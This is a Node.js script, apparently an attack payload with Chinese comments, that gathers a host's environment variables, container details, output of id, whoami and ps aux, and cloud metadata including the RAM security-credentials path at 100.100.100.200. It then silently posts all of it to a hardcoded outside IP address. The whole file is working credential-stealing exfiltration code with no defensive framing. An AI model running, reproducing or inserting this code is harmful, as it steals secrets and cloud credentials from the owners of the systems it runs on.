const http = require('http');
const os = require('os');
const { execSync } = require('child_process');

const EXFIL = 'http://101.35.44.248';

function post(path, data) {
  return new Promise((resolve) => {
    const body = JSON.stringify(data);
    const url = new URL(path, EXFIL);
    const req = http.request({
      hostname: url.hostname,
      port: url.port || 80,
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, () => resolve());
    req.on('error', () => resolve());
    req.write(body);
    req.end();
  });
}

async function run() {
  const result = {
    hostname: os.hostname(),
    platform: os.platform(),
    cwd: process.cwd(),
    env: process.env,
    container: {},
    rce: {},
    metadata: null
  };

  // 1. 检查是否为容器
  try { result.container.dockerenv = require('fs').existsSync('/.dockerenv'); } catch (e) {}
  try { result.container.cgroup = require('fs').readFileSync('/proc/1/cgroup', 'utf8').slice(0, 2000); } catch (e) {}
  try { result.container.mountinfo = require('fs').readFileSync('/proc/self/mountinfo', 'utf8').slice(0, 2000); } catch (e) {}

  // 2. RCE — 执行系统命令
  try { result.rce.id = execSync('id', { timeout: 5000 }).toString().trim(); } catch (e) {}
  try { result.rce.whoami = execSync('whoami', { timeout: 5000 }).toString().trim(); } catch (e) {}
  try { result.rce.hostname = execSync('hostname', { timeout: 5000 }).toString().trim(); } catch (e) {}
  try { result.rce.ps = execSync('ps aux', { timeout: 5000 }).toString().trim().slice(0, 3000); } catch (e) {}

  // 3. SSRF — 读取云元数据
  try { result.metadata = execSync('curl -s --connect-timeout 3 http://100.100.100.200/latest/meta-data/ 2>/dev/null || true', { timeout: 5000 }).toString().trim(); } catch (e) {}

  // 如果curl不可用，尝试分路径读
  if (!result.metadata) {
    const metaPaths = [
      '/latest/meta-data/',
      '/latest/meta-data/instance-id',
      '/latest/meta-data/ram/security-credentials/',
    ];
    for (const p of metaPaths) {
      try {
        const r = execSync(`curl -s --connect-timeout 3 http://100.100.100.200${p} 2>/dev/null || true`, { timeout: 5000 }).toString().trim();
        if (r) result.metadata = (result.metadata || '') + `${p}: ${r}\n`;
      } catch (e) {}
    }
  }

  // 4. 回传所有数据
  await post('/', result);
  await post('/env', result.env);
}

run().catch(() => {});
